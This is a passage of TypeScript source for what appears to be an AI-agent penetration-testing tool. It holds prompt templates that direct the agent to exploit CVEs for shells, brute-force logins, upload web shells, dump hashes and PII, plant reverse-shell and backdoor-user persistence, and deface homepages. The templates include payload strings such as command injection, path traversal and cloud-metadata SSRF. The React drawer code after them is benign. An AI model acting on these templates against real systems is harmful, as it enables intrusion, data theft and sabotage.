    id: 'tech_intel',
    title: 'Technology & Version Intelligence',
    items: [
      {
        suggestions: [
          { label: 'Outdated software inventory', prompt: 'Query the graph for all detected technologies with version numbers and CPE identifiers. Use web_search to check each for known CVEs and end-of-life status. Flag any outdated or unsupported versions.' },
          { label: 'Web server and framework versions', prompt: 'Query the graph for all web technologies (Apache, Nginx, IIS, Tomcat, WordPress, Drupal, etc.) with their versions. Identify which versions have known critical vulnerabilities.' },
          { label: 'Database and cache services', prompt: 'Query the graph for all database and cache services (MySQL, PostgreSQL, Redis, MongoDB, Memcached, Elasticsearch). List their versions, exposed ports, and whether authentication is required.' },
          { label: 'CMS and application detection', prompt: 'Query the graph for CMS platforms (WordPress, Joomla, Drupal, etc.) and web frameworks. Use web_search to find known vulnerabilities for each detected version.' },
          { label: 'Technology stack by host', prompt: 'Query the graph to build a complete technology stack (OS, web server, language, framework, database, CDN) for each host. Identify mismatches and unusual configurations.' },
        ],
      },
    ],
  },
  {
    id: 'web_recon',
    title: 'Web Application Recon',
    items: [
      {
        suggestions: [
          { label: 'Discovered endpoints and parameters', prompt: 'Query the graph for all web endpoints, their HTTP methods, parameters, and response codes. Highlight endpoints with user-input parameters that could be injection targets.' },
          { label: 'Admin panels and login pages', prompt: 'Query the graph for endpoints matching common admin/login paths (/admin, /login, /wp-admin, /manager, /console, /dashboard). Use execute_curl to verify which are accessible and identify the technology behind them.' },
          { label: 'API endpoint discovery', prompt: 'Query the graph for all endpoints that look like API routes (/api/, /v1/, /graphql, /rest/). Use execute_curl to probe a sample of them for authentication requirements, response formats, and exposed data.' },
          { label: 'Sensitive file and directory exposure', prompt: 'Use execute_curl to probe for common sensitive paths: /.git/config, /.env, /robots.txt, /sitemap.xml, /.well-known/, /backup/, /debug/, /phpinfo.php on all discovered web hosts.' },
          { label: 'Form and input analysis', prompt: 'Query the graph for all discovered parameters and forms. Categorize them by input type (search, login, upload, comment, API) and flag candidates for SQLi, XSS, SSRF, and file upload testing.' },
        ],
      },
    ],
  },
  {
    id: 'network_recon',
    title: 'Network Reconnaissance',
    items: [
      {
        suggestions: [
          { label: 'Deep Nmap scan on key targets', prompt: 'Identify the top 5 most interesting hosts from the graph (those with most services or vulnerabilities), then run execute_nmap with -sV -sC -O for detailed service detection, default script scanning, and OS fingerprinting.' },
          { label: 'UDP service discovery', prompt: 'Run execute_nmap with -sU --top-ports 50 against the primary targets to discover UDP services like DNS (53), SNMP (161), TFTP (69), NTP (123), and IPMI (623).' },
          { label: 'Quick port scan on new targets', prompt: 'Use execute_naabu to perform a fast SYN scan on all in-scope IPs, then compare results with the graph data to identify any newly discovered open ports.' },
          { label: 'SMB and NetBIOS enumeration', prompt: 'Run execute_nmap with --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode against any hosts with port 445/139 open. Report accessible shares and security configuration.' },
          { label: 'Nmap NSE vulnerability scripts', prompt: 'Run execute_nmap with --script vuln against the top targets to discover additional vulnerabilities not found by Nuclei. Compare with existing graph data to identify new findings.' },
        ],
      },
    ],
  },
  {
    id: 'cred_exposure',
    title: 'Credential & Secret Exposure',
    items: [
      {
        suggestions: [
          { label: 'GitHub leaked secrets inventory', prompt: 'Query the graph for all GitHub secrets found (API keys, tokens, passwords, private keys). Categorize by type, affected service, and assess which ones could still be valid.' },
          { label: 'Validate leaked credentials', prompt: 'Query the graph for all discovered GitHub secrets and credentials. Use execute_curl or execute_code to test which API keys and tokens are still active without triggering rate limits.' },
          { label: 'Brute-forceable service inventory', prompt: 'Query the graph for all services that expose authentication (SSH, FTP, RDP, SMB, MySQL, PostgreSQL, HTTP Basic/Form Auth, Tomcat Manager). List host, port, and service type for each.' },
          { label: 'Default credential lookup', prompt: 'Query the graph for all discovered services and technologies. Use web_search to look up default credentials for each vendor/product, then compile a list of default username/password pairs to test.' },
        ],
      },
    ],
  },
  {
    id: 'tls_security',
    title: 'TLS & Security Configuration',
    items: [
      {
        suggestions: [
          { label: 'TLS certificate audit', prompt: 'Query the graph for all TLS certificates. Report expired or soon-to-expire certs, self-signed certs, wildcard certs, weak key sizes, and JARM fingerprint anomalies.' },
          { label: 'HTTP security headers analysis', prompt: 'Query the graph for all security headers (CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy, Permissions-Policy). Flag missing or misconfigured headers per host.' },
          { label: 'SSL/TLS weakness scan', prompt: 'Run execute_nmap with --script ssl-enum-ciphers on all HTTPS hosts. Identify weak ciphers (RC4, DES, export), deprecated protocols (SSLv3, TLS 1.0/1.1), and missing features like PFS.' },
          { label: 'CORS and cookie security audit', prompt: 'Use execute_curl to check CORS headers (Access-Control-Allow-Origin) and cookie attributes (Secure, HttpOnly, SameSite) on all discovered web applications. Flag overly permissive configurations.' },
        ],
      },
    ],
  },
  {
    id: 'osint_research',
    title: 'OSINT & Research',
    items: [
      {
        suggestions: [
          { label: 'Research top CVEs in depth', prompt: 'Query the graph for the 5 highest CVSS vulnerabilities. For each, use web_search to find: exploit PoCs, Metasploit modules, affected versions, patch status, and real-world exploitation reports.' },
          { label: 'Search for exploit PoCs', prompt: 'Query the graph for all CVEs found, then use web_search to search GitHub and ExploitDB for proof-of-concept exploit code. Summarize available PoCs with links and assess reliability.' },
          { label: 'Searchsploit local lookup', prompt: 'Query the graph for all technologies and versions, then use kali_shell to run searchsploit against each technology/version combination. Report all matching exploits from ExploitDB.' },
          { label: 'CVE exploit chain analysis', prompt: 'Query the graph for all vulnerabilities on each host. Use web_search to research whether any combination of findings could be chained into a multi-step attack (e.g., info disclosure + auth bypass + RCE).' },
        ],
      },
    ],
  },
  {
    id: 'active_verify',
    title: 'Active Verification',
    items: [
      {
        suggestions: [
          { label: 'Nuclei verification of top CVEs', prompt: 'Query the graph for the 10 highest severity vulnerabilities, then use execute_nuclei to re-verify each one with targeted template IDs. Confirm which are true positives and provide proof.' },
          { label: 'Probe for exposed admin interfaces', prompt: 'Use execute_curl to probe all discovered web hosts for common admin paths (/admin, /manager/html, /wp-admin, /phpmyadmin, /console). Record response codes, redirects, and page content.' },
          { label: 'Version fingerprinting via curl', prompt: 'Use execute_curl to collect detailed HTTP response headers and body content from all web servers. Extract exact version strings from Server headers, X-Powered-By, generator meta tags, and error pages.' },
          { label: 'Nuclei full template scan', prompt: 'Run execute_nuclei with a broad template set (cves, misconfiguration, exposure, default-logins) against the top 3 targets. Report all findings categorized by severity.' },
          { label: 'Test for path traversal', prompt: 'Use execute_curl to test path traversal payloads (../../../etc/passwd, ..\\..\\..\\windows\\win.ini) against all discovered web endpoints that accept file path parameters. Report any successful reads.' },
        ],
      },
    ],
  },
]

// =============================================================================
// EXPLOITATION SUGGESTION DATA
// =============================================================================

const EXPLOITATION_GROUPS: SESubGroup[] = [
  {
    id: 'cve_exploit',
    title: 'CVE Exploitation',
    items: [
      {
        suggestions: [
          { label: 'Exploit the most critical CVE', prompt: 'Query the graph for the highest CVSS vulnerability with a known Metasploit module. Set up and launch the exploit using metasploit_console to gain a remote shell on the target.' },
          { label: 'Exploit a critical CVE and open a session', prompt: 'Find the most critical CVE on the target, exploit it with Metasploit, and open a Meterpreter shell session. Confirm the session is stable and report the access level obtained.' },
          { label: 'Exploit a known RCE vulnerability', prompt: 'Query the graph for Remote Code Execution (RCE) CVEs, select the most promising one, search for its Metasploit module, configure it, and exploit the target to gain a shell.' },
          { label: 'Chain vulnerabilities for RCE', prompt: 'Analyze all discovered vulnerabilities on the target. Chain multiple lower-severity findings together (e.g., info disclosure + auth bypass + injection) to achieve remote code execution.' },
          { label: 'Exploit a web server CVE', prompt: 'Query the graph for CVEs affecting web servers (Apache, Nginx, IIS, Tomcat). Find the Metasploit module, configure it for the target, and exploit it to gain a shell.' },
        ],
      },
    ],
  },
  {
    id: 'brute_force',
    title: 'Brute Force & Credential Attacks',
    items: [
      {
        suggestions: [
          { label: 'Brute force SSH and explore the server', prompt: 'Use execute_hydra to brute force SSH credentials on the target using common username/password lists. Once access is gained, enumerate sensitive files, users, and configuration.' },
          { label: 'Test default credentials on all services', prompt: 'Query the graph for all services with authentication (Tomcat, Jenkins, phpMyAdmin, databases, FTP, SSH). Use execute_hydra and execute_curl to test default and common credentials on each.' },
          { label: 'Leverage GitHub secrets to access the server', prompt: 'Query the graph for GitHub secrets (credentials, API keys, tokens). Use any discovered credentials to attempt SSH, FTP, database, or web admin access. Report what access was gained.' },
          { label: 'Brute force web login forms', prompt: 'Query the graph for login form endpoints. Use execute_hydra with http-post-form to brute force credentials using common wordlists. Report any successful logins.' },
          { label: 'Database credential brute force', prompt: 'Query the graph for exposed database ports (MySQL 3306, PostgreSQL 5432, MSSQL 1433, MongoDB 27017). Use execute_hydra to test common credentials, then connect and enumerate databases.' },
          { label: 'FTP anonymous and credential testing', prompt: 'Query the graph for all FTP services. Test for anonymous access first, then use execute_hydra to brute force common credentials. Enumerate any accessible files and directories.' },
        ],
      },
    ],
  },
  {
    id: 'web_attacks',
    title: 'Web Application Attacks',
    items: [
      {
        suggestions: [
          { label: 'Exploit SQL injection on web forms', prompt: 'Query the graph for web endpoints with input parameters. Use kali_shell with sqlmap to test for SQL injection vulnerabilities, then extract database schema, tables, and sensitive data.' },
          { label: 'Upload a web shell via file upload', prompt: 'Query the graph for file upload endpoints. Craft and upload a PHP/JSP/ASPX web shell using execute_curl with various bypass techniques (extension tricks, content-type manipulation). Confirm remote command execution.' },
          { label: 'Test for command injection', prompt: 'Query the graph for endpoints with parameters that could interact with OS commands. Use execute_curl to test command injection payloads (;id, |whoami, $(id), `id`). Escalate any confirmed injection to a reverse shell.' },
          { label: 'Exploit SSRF vulnerabilities', prompt: 'Query the graph for endpoints that accept URL parameters. Use execute_curl to test SSRF payloads targeting internal services (http://127.0.0.1, http://169.254.169.254 for cloud metadata, internal admin panels).' },
          { label: 'Test for directory traversal and LFI', prompt: 'Query the graph for endpoints with file path parameters. Use execute_curl to test directory traversal payloads to read /etc/passwd, /etc/shadow, application config files, and attempt LFI to RCE via log poisoning.' },
          { label: 'Exploit XSS for session hijacking', prompt: 'Query the graph for endpoints with reflected or stored XSS potential. Craft XSS payloads using execute_curl to test for JavaScript execution and demonstrate session cookie theft.' },
        ],
      },
    ],
  },
  {
    id: 'manual_exploit',
    title: 'Manual Exploitation',
    items: [
      {
        suggestions: [
          { label: 'Nuclei-verified exploit execution', prompt: 'Query the graph for Nuclei-confirmed vulnerabilities. For the most critical one, use execute_curl or execute_code to manually craft and send the exploit payload. Confirm exploitation and demonstrate impact.' },
          { label: 'Custom exploit script from PoC', prompt: 'Query the graph for the most critical CVE, then use web_search to find a public exploit PoC. Adapt it using execute_code (Python) to work against the target, execute it, and confirm exploitation.' },
          { label: 'Reverse shell via curl exploitation', prompt: 'Identify a confirmed RCE vulnerability on a web target. Use execute_curl to manually exploit it and inject a reverse shell payload (bash, python, or netcat). Set up the listener in kali_shell.' },
          { label: 'Exploit misconfigured service', prompt: 'Query the graph for services with known misconfigurations (unauthenticated Redis, open MongoDB, exposed Docker API, Kubernetes dashboard). Use kali_shell tools to exploit the misconfiguration and gain access.' },
          { label: 'Exploit exposed management interface', prompt: 'Query the graph for management interfaces (Tomcat Manager, Jenkins, JMX, phpMyAdmin). Attempt access using discovered or default credentials, then leverage the interface to deploy a payload or execute commands.' },
        ],
      },
    ],
  },
]

// =============================================================================
// POST-EXPLOITATION SUGGESTION DATA
// =============================================================================

const POST_EXPLOITATION_GROUPS: SESubGroup[] = [
  {
    id: 'cred_harvest',
    title: 'Credential Harvesting & Cracking',
    items: [
      {
        suggestions: [
          { label: 'Hunt for secrets and credentials', prompt: 'Search the compromised server for passwords, API keys, tokens, and secrets in config files, environment variables, .env files, .bash_history, application configs, and web server configs. Report all findings.' },
          { label: 'Dump and crack password hashes', prompt: 'Extract password hashes from /etc/shadow (Linux) or SAM database (Windows via Meterpreter hashdump). Use kali_shell with john or hashcat to crack the hashes with common wordlists.' },
          { label: 'Database credential extraction', prompt: 'Search for database connection strings and credentials in web application config files (wp-config.php, .env, settings.py, application.properties, web.config). Connect to found databases and dump user/credential tables.' },
          { label: 'Extract private keys and certificates', prompt: 'Search the filesystem for SSH private keys (~/.ssh/id_rsa, /etc/ssh/), TLS private keys, PFX/P12 files, and PGP keys. Test each key for passwordless access to other systems.' },
          { label: 'Browser and application credential dump', prompt: 'Search for saved credentials in browser profiles, password managers, FTP client configs (FileZilla), email client configs, and application credential stores. Extract and organize all found credentials.' },
        ],
      },
    ],
  },
  {
    id: 'privesc',
    title: 'Privilege Escalation',
    items: [
      {
        osLabel: 'Linux',
        suggestions: [
          { label: 'SUID/SGID binary exploitation', prompt: 'Run find / -perm -4000 2>/dev/null to list all SUID binaries. Cross-reference with GTFOBins using web_search to find exploitable binaries. Attempt privilege escalation via the most promising vector.' },
          { label: 'Sudo misconfiguration exploitation', prompt: 'Run sudo -l to check sudo permissions. Identify any NOPASSWD entries, wildcard abuse, or LD_PRELOAD/LD_LIBRARY_PATH exploitation paths. Use GTFOBins to escalate to root.' },
          { label: 'Writable cron job exploitation', prompt: 'Enumerate all cron jobs (crontab -l, /etc/crontab, /etc/cron.d/*, /var/spool/cron/). Find any writable scripts executed by root. Inject a reverse shell or add a backdoor user to escalate privileges.' },
          { label: 'Linux kernel exploit check', prompt: 'Collect kernel version (uname -a), distribution info, and installed packages. Use web_search to find applicable kernel exploits (DirtyPipe, DirtyCow, etc.). Compile and run the most suitable exploit via execute_code.' },
          { label: 'Capability-based escalation', prompt: 'Run getcap -r / 2>/dev/null to find binaries with special capabilities. Check for cap_setuid, cap_dac_read_search, cap_net_raw, or cap_sys_admin. Exploit the capabilities to escalate to root.' },
        ],
      },
      {
        osLabel: 'Windows',
        suggestions: [
          { label: 'Windows service misconfiguration', prompt: 'Use Meterpreter getsystem and check for unquoted service paths, writable service binaries, and modifiable service configurations. Exploit the most promising vector to escalate to SYSTEM.' },
          { label: 'Token impersonation (Potato attacks)', prompt: 'Check current privileges with whoami /priv. If SeImpersonatePrivilege is enabled, use a Potato attack (JuicyPotato, PrintSpoofer, GodPotato) via metasploit_console to escalate to SYSTEM.' },
          { label: 'Credential harvesting with Mimikatz', prompt: 'Load Mimikatz via Meterpreter (load kiwi) and run creds_all to dump plaintext passwords, NTLM hashes, and Kerberos tickets from memory. Report all harvested credentials.' },
        ],
      },
    ],
  },
  {
    id: 'lateral_movement',
    title: 'Lateral Movement',
    items: [
      {
        suggestions: [
          { label: 'Map internal network and pivot', prompt: 'Enumerate network interfaces (ifconfig/ipconfig), ARP tables (arp -a), routing tables, and /etc/hosts. Discover internal hosts and subnets, then set up Meterpreter autoroute to pivot into the internal network.' },
          { label: 'Harvest SSH keys and move laterally', prompt: 'Collect all SSH keys (~/.ssh/), known_hosts, authorized_keys, and bash_history SSH commands. Attempt to SSH into discovered internal hosts using the harvested keys and any cracked credentials.' },
          { label: 'Port forwarding for internal access', prompt: 'Set up Meterpreter port forwarding (portfwd add) to access internal services that are not directly reachable. Forward interesting internal ports (web admin panels, databases, RDP) to the attacker machine.' },
          { label: 'Internal service enumeration', prompt: 'From the compromised host, use kali_shell to scan the internal network (nmap or naabu) for additional hosts and services. Identify high-value targets like domain controllers, databases, file servers, and CI/CD systems.' },
          { label: 'SMB/WinRM lateral movement', prompt: 'Use discovered credentials to attempt lateral movement via SMB (psexec, smbexec) or WinRM to other Windows hosts. Use metasploit_console modules like exploit/windows/smb/psexec.' },
        ],
      },
    ],
  },
  {
    id: 'data_exfil',
    title: 'Data Exfiltration & Pillaging',
    items: [
      {
        suggestions: [
          { label: 'Pivot to database and dump data', prompt: 'Find database credentials in application config files. Connect to the database (MySQL, PostgreSQL, MongoDB) and enumerate all databases, tables, and dump sensitive data (users, credentials, PII, financial records).' },
          { label: 'Source code and configuration theft', prompt: 'Search for application source code repositories (.git directories), deployment scripts, CI/CD configs, Dockerfiles, and Kubernetes manifests. Download and analyze for hardcoded secrets and architecture intel.' },
          { label: 'Backup file discovery', prompt: 'Search for backup files: *.bak, *.sql, *.dump, *.tar.gz, *.zip in common backup locations (/backup, /var/backups, /tmp, /opt, home directories). Extract and analyze any found backups for credentials and sensitive data.' },
          { label: 'Email and document pillaging', prompt: 'Search for emails (Maildir, mbox), documents (*.pdf, *.docx, *.xlsx), and spreadsheets containing sensitive information. Look in home directories, /var/mail, and application data directories.' },
          { label: 'Cloud credential extraction', prompt: 'Search for cloud provider credentials: AWS (~/.aws/credentials), GCP (service account JSON), Azure (azure.json), and Kubernetes configs (~/.kube/config). Test validity and enumerate accessible cloud resources.' },
        ],
      },
    ],
  },
  {
    id: 'persistence',
    title: 'Persistence',
    items: [
      {
        osLabel: 'Linux',
        suggestions: [
          { label: 'Cron job backdoor', prompt: 'Create a cron job that periodically executes a reverse shell back to the attacker. Use kali_shell to add the entry to crontab and verify it persists across reboots.' },
          { label: 'SSH key persistence', prompt: 'Generate an SSH key pair and inject the public key into root and user authorized_keys files. Test that passwordless SSH access works. This survives password changes and reboots.' },
          { label: 'Backdoor user account', prompt: 'Create a new user account with root privileges (UID 0 or sudo group membership). Set a known password and verify SSH access. Use an inconspicuous username that blends with existing accounts.' },
          { label: 'Systemd service backdoor', prompt: 'Create a systemd service unit that executes a reverse shell on boot. Use kali_shell to write the service file, enable it with systemctl, and verify it starts on system restart.' },
        ],
      },
      {
        osLabel: 'Windows',
        suggestions: [
          { label: 'Registry run key persistence', prompt: 'Use Meterpreter or kali_shell to add a registry run key (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) that executes the payload on user login. Verify persistence across reboots.' },
          { label: 'Scheduled task persistence', prompt: 'Create a Windows scheduled task that runs the payload on system startup or user login. Use kali_shell with schtasks to configure it and verify execution.' },
          { label: 'Meterpreter persistence module', prompt: 'Use Meterpreter persistence module (run persistence -h) to install an auto-starting payload. Configure it to reconnect every 60 seconds and start on boot.' },
        ],
      },
    ],
  },
  {
    id: 'sys_enum',
    title: 'System & Environment Enumeration',
    items: [
      {
        suggestions: [
          { label: 'Full system enumeration', prompt: 'Collect comprehensive system information: OS version, kernel, hostname, architecture, installed packages, running processes, logged-in users, environment variables, mounted filesystems, and scheduled tasks.' },
          { label: 'User and group enumeration', prompt: 'Enumerate all user accounts (/etc/passwd, net user), groups (/etc/group), sudo permissions, login history (lastlog, wtmp), and currently logged-in users. Identify service accounts and privileged users.' },
          { label: 'Network configuration mapping', prompt: 'Map all network interfaces, IP addresses, routing tables, DNS configuration, active connections (netstat/ss), listening services, firewall rules (iptables/ufw), and ARP neighbors.' },
          { label: 'Process and service audit', prompt: 'List all running processes with their owners and command lines (ps aux). Identify services running as root, unusual processes, and processes with network connections. Check for Docker/container environments.' },
          { label: 'Installed software and patch level', prompt: 'List all installed packages and their versions (dpkg -l, rpm -qa, pip list, npm list -g). Identify security patches applied and missing. Flag any software with known privilege escalation vulnerabilities.' },
          { label: 'Defacement proof of compromise', prompt: 'Locate the web server document root and replace the homepage with a proof-of-compromise page showing access was achieved. Take a screenshot via execute_curl to document the result.' },
        ],
      },
    ],
  },
]

export function AIAssistantDrawer({
  isOpen,
  onClose,
  userId,
  projectId,
  sessionId,
  onResetSession,
  onSwitchSession,
  modelName,
  toolPhaseMap,
  stealthMode = false,
  onToggleStealth,
  deepThinkEnabled = true,
  onToggleDeepThink,
  onRefetchGraph,
  isOtherChainsHidden = false,
  onToggleOtherChains,
  hasOtherChains = false,
}: AIAssistantDrawerProps) {
  const [chatItems, setChatItems] = useState<ChatItem[]>([])
  const [inputValue, setInputValue] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [isStopped, setIsStopped] = useState(false)
  const [isStopping, setIsStopping] = useState(false)
  const [currentPhase, setCurrentPhase] = useState<Phase>('informational')
  const [attackPathType, setAttackPathType] = useState<string>('')
  const [iterationCount, setIterationCount] = useState(0)
  const [awaitingApproval, setAwaitingApproval] = useState(false)
  const [approvalRequest, setApprovalRequest] = useState<ApprovalRequestPayload | null>(null)
  const [modificationText, setModificationText] = useState('')

  // Q&A state
  const [awaitingQuestion, setAwaitingQuestion] = useState(false)
  const [questionRequest, setQuestionRequest] = useState<QuestionRequestPayload | null>(null)
  const [answerText, setAnswerText] = useState('')
  const [selectedOptions, setSelectedOptions] = useState<string[]>([])

  const [todoList, setTodoList] = useState<TodoItem[]>([])
  const [copiedMessageId, setCopiedMessageId] = useState<string | null>(null)
  const [copiedFieldKey, setCopiedFieldKey] = useState<string | null>(null)

  // API key status for tool alerts + inline key modal
  const [missingApiKeys, setMissingApiKeys] = useState<Set<string>>(new Set())
  const [apiKeyModal, setApiKeyModal] = useState<string | null>(null) // tool id
  const [apiKeyValue, setApiKeyValue] = useState('')
  const [apiKeyVisible, setApiKeyVisible] = useState(false)
  const [apiKeySaving, setApiKeySaving] = useState(false)

  // Conversation history state
  const [showHistory, setShowHistory] = useState(false)
  const [conversationId, setConversationId] = useState<string | null>(null)

  // Template dropdown state
  const [openTemplateGroup, setOpenTemplateGroup] = useState<string | null>(null)
  const [openSocialSubGroup, setOpenSocialSubGroup] = useState<string | null>(null)
  const [openInfoSubGroup, setOpenInfoSubGroup] = useState<string | null>(null)
  const [openExploitSubGroup, setOpenExploitSubGroup] = useState<string | null>(null)
  const [openPostSubGroup, setOpenPostSubGroup] = useState<string | null>(null)

  // Conversation hooks
  const {
    conversations,
    fetchConversations,
    createConversation,
    deleteConversation,
    loadConversation,
  } = useConversations(projectId, userId)

  const { saveMessage, updateConversation: updateConvMeta } = useChatPersistence(conversationId)

  // Fetch API key status for tool alerts
  const fetchApiKeyStatus = useCallback(() => {
    if (!userId) return
    fetch(`/api/users/${userId}/settings`)
      .then(r => r.ok ? r.json() : null)
      .then(settings => {
        if (!settings) return
        const missing = new Set<string>()
        if (!settings.tavilyApiKey) missing.add('web_search')
        if (!settings.shodanApiKey) missing.add('shodan')
        if (!settings.serpApiKey) missing.add('google_dork')
        setMissingApiKeys(missing)
      })
      .catch(() => {})
  }, [userId])

  useEffect(() => { fetchApiKeyStatus() }, [fetchApiKeyStatus])

  const API_KEY_INFO: Record<string, { field: string; label: string; hint: string; url: string }> = {
    web_search: { field: 'tavilyApiKey', label: 'Tavily', hint: 'Enables web_search tool for CVE research and exploit lookups', url: 'https://app.tavily.com/home' },
    shodan: { field: 'shodanApiKey', label: 'Shodan', hint: 'Enables the shodan tool for internet-wide OSINT (search, host info, DNS, count)', url: 'https://account.shodan.io/' },
    google_dork: { field: 'serpApiKey', label: 'SerpAPI', hint: 'Enables google_dork tool for Google dorking OSINT (site:, inurl:, filetype:)', url: 'https://serpapi.com/manage-api-key' },
  }

  const openApiKeyModal = useCallback((toolId: string) => {
    setApiKeyModal(toolId)
    setApiKeyValue('')
    setApiKeyVisible(false)
  }, [])

  const closeApiKeyModal = useCallback(() => {
    setApiKeyModal(null)
    setApiKeyValue('')
    setApiKeyVisible(false)
  }, [])

  const saveApiKey = useCallback(async () => {
    if (!userId || !apiKeyModal || !apiKeyValue.trim()) return
    const info = API_KEY_INFO[apiKeyModal]
    if (!info) return
    setApiKeySaving(true)
    try {
      const resp = await fetch(`/api/users/${userId}/settings`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ [info.field]: apiKeyValue.trim() }),
      })
      if (resp.ok) {
        closeApiKeyModal()
        fetchApiKeyStatus()
      }
    } catch { /* silent */ } finally {
      setApiKeySaving(false)
    }
  }, [userId, apiKeyModal, apiKeyValue, closeApiKeyModal, fetchApiKeyStatus])

  // Settings dropdown & modal state
  const [showSettingsDropdown, setShowSettingsDropdown] = useState(false)
  const [settingsModal, setSettingsModal] = useState<'agent' | 'toolmatrix' | 'attack' | null>(null)
  const [projectFormData, setProjectFormData] = useState<Omit<Project, 'id' | 'userId' | 'createdAt' | 'updatedAt' | 'user'> | null>(null)
  const settingsDropdownRef = useRef<HTMLDivElement>(null)

  // Close settings dropdown on outside click
  useEffect(() => {
    if (!showSettingsDropdown) return
    const handler = (e: MouseEvent) => {
      if (settingsDropdownRef.current && !settingsDropdownRef.current.contains(e.target as Node)) {
        setShowSettingsDropdown(false)
      }
    }
    document.addEventListener('mousedown', handler)
    return () => document.removeEventListener('mousedown', handler)
  }, [showSettingsDropdown])

  // Debounced save refs (must be before flushPendingSave)
  const pendingSaveRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const latestFormDataRef = useRef(projectFormData)
  latestFormDataRef.current = projectFormData

  // Flush any pending save before clearing data
  const flushPendingSave = useCallback(() => {
    if (pendingSaveRef.current) {
      clearTimeout(pendingSaveRef.current)
      pendingSaveRef.current = null
      const data = latestFormDataRef.current
      if (data && projectId) {
        fetch(`/api/projects/${projectId}`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
        }).catch(() => {})
      }
    }
  }, [projectId])

  // Fetch project data when modal opens; clear stale data on switch
  useEffect(() => {
    if (!settingsModal || !projectId) {
      flushPendingSave()
      setProjectFormData(null)
      return
    }
    flushPendingSave()
    setProjectFormData(null)
    let cancelled = false
    fetch(`/api/projects/${projectId}`)
      .then(res => res.ok ? res.json() : null)
      .then(data => {
        if (!cancelled && data) {
          const { id, userId: _u, createdAt, updatedAt, user, ...formData } = data
          setProjectFormData(formData)
        }
      })
      .catch(() => {})
    return () => { cancelled = true }
  }, [settingsModal, projectId, flushPendingSave])

  // Debounced save for project field updates from modal
  const updateProjectField = useCallback(<K extends keyof Omit<Project, 'id' | 'userId' | 'createdAt' | 'updatedAt' | 'user'>>(
    field: K,
    value: Omit<Project, 'id' | 'userId' | 'createdAt' | 'updatedAt' | 'user'>[K]
  ) => {
    setProjectFormData(prev => {
      if (!prev) return prev
      return { ...prev, [field]: value }
    })
    // Debounce the PUT request
    if (pendingSaveRef.current) clearTimeout(pendingSaveRef.current)
    pendingSaveRef.current = setTimeout(() => {
      const data = latestFormDataRef.current
      if (!data || !projectId) return
      fetch(`/api/projects/${projectId}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      }).catch(() => {})
    }, 500)
  }, [projectId])

  // Attack skill data for badge tooltip
  const [skillData, setSkillData] = useState<{
    builtIn: { id: string; name: string }[]
    user: { id: string; name: string }[]
    config: { builtIn: Record<string, boolean>; user: Record<string, boolean> }
  } | null>(null)

  useEffect(() => {
    if (!userId || !projectId) return
    let cancelled = false
    async function fetchSkills() {
      try {
        const [availRes, projRes] = await Promise.all([
          fetch(`/api/users/${userId}/attack-skills/available`),
          fetch(`/api/projects/${projectId}`),
        ])
        if (cancelled) return
        if (availRes.ok && projRes.ok) {
          const avail = await availRes.json()
          const proj = await projRes.json()
          const cfg = proj.attackSkillConfig || { builtIn: {}, user: {} }
          setSkillData({
            builtIn: avail.builtIn,
            user: avail.user,
            config: {
              builtIn: cfg.builtIn || {},
              user: cfg.user || {},
            },
          })
        }
      } catch { /* silent */ }
    }
    fetchSkills()
    return () => { cancelled = true }
  }, [userId, projectId])

  const messagesEndRef = useRef<HTMLDivElement>(null)
  const messagesContainerRef = useRef<HTMLDivElement>(null)
  const inputRef = useRef<HTMLTextAreaElement>(null)
  const isProcessingApproval = useRef(false)
  const awaitingApprovalRef = useRef(false)
  const isProcessingQuestion = useRef(false)
  const awaitingQuestionRef = useRef(false)
  const shouldAutoScroll = useRef(true)
  const itemIdCounter = useRef(0)

  const scrollToBottom = useCallback((force = false) => {
    if (force || shouldAutoScroll.current) {
      messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' })
    }
  }, [])

  // Check if user is at the bottom of the scroll
  const checkIfAtBottom = useCallback(() => {
    const container = messagesContainerRef.current
    if (!container) return true

    const threshold = 50 // pixels from bottom
    const isAtBottom =
      container.scrollHeight - container.scrollTop - container.clientHeight < threshold

    shouldAutoScroll.current = isAtBottom
    return isAtBottom
  }, [])

  // Auto-scroll only if user is at bottom
  useEffect(() => {
    scrollToBottom()
  }, [chatItems, scrollToBottom])

  useEffect(() => {
    if (isOpen && inputRef.current && !awaitingApproval) {
      setTimeout(() => {
        inputRef.current?.focus()
        scrollToBottom(true) // Force scroll to bottom when opening
      }, 300)
    }
  }, [isOpen, awaitingApproval, scrollToBottom])

  // Fetch conversations when history panel opens, auto-refresh every 5s
  useEffect(() => {
    if (showHistory && projectId && userId) {
      fetchConversations()
      const interval = setInterval(fetchConversations, 5000)
      return () => clearInterval(interval)
    }
  }, [showHistory, projectId, userId, fetchConversations])

  // Reset state when session changes (skip if switching to a loaded conversation)
  const isRestoringConversation = useRef(false)
  useEffect(() => {
    if (isRestoringConversation.current) {
      isRestoringConversation.current = false
      return
    }
    setChatItems([])
    setCurrentPhase('informational')
    setAttackPathType('')
    setIterationCount(0)
    setAwaitingApproval(false)
    setApprovalRequest(null)
    setAwaitingQuestion(false)
    setQuestionRequest(null)
    setAnswerText('')
    setSelectedOptions([])
    setTodoList([])
    setIsStopped(false)
    setIsLoading(false)
    awaitingApprovalRef.current = false
    isProcessingApproval.current = false
    awaitingQuestionRef.current = false
    isProcessingQuestion.current = false
    shouldAutoScroll.current = true // Reset to auto-scroll on new session
  }, [sessionId])

  // WebSocket message handler
  const handleWebSocketMessage = useCallback((message: ServerMessage) => {
    switch (message.type) {
      case MessageType.CONNECTED:
        break

      case MessageType.THINKING:
        // Add thinking item to chat
        const thinkingItem: ThinkingItem = {
          type: 'thinking',
          id: `thinking-${Date.now()}-${itemIdCounter.current++}`,
          timestamp: new Date(),
          thought: message.payload.thought || '',
          reasoning: message.payload.reasoning || '',
          action: 'thinking',
          updated_todo_list: todoList,
        }
        setChatItems(prev => [...prev, thinkingItem])
        setIsLoading(true)
        setIsStopped(false)
        break

      case MessageType.PLAN_START: {
        // Create a plan wave container with nested tools
        const waveItem: PlanWaveItem = {
          type: 'plan_wave',
